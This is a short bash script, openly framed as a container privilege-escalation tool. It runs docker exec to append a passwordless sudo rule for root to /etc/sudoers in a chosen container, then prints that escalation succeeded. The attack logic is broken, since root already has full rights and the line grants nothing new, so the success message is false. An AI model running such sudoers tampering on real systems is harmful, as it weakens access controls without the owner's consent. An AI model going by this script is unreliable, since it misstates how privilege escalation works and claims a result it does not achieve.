#!/bin/bash
# Escalate privileges in a container
# Usage: container_escalation.sh <container_id>

CONTAINER_ID=$1

if [ -z "$CONTAINER_ID" ]; then
    echo "Usage: $0 <container_id>"
    exit 1
fi

echo "Escalating privileges in container: $CONTAINER_ID"

docker exec -it $CONTAINER_ID /bin/sh -c "echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"

echo "Privilege escalation completed."
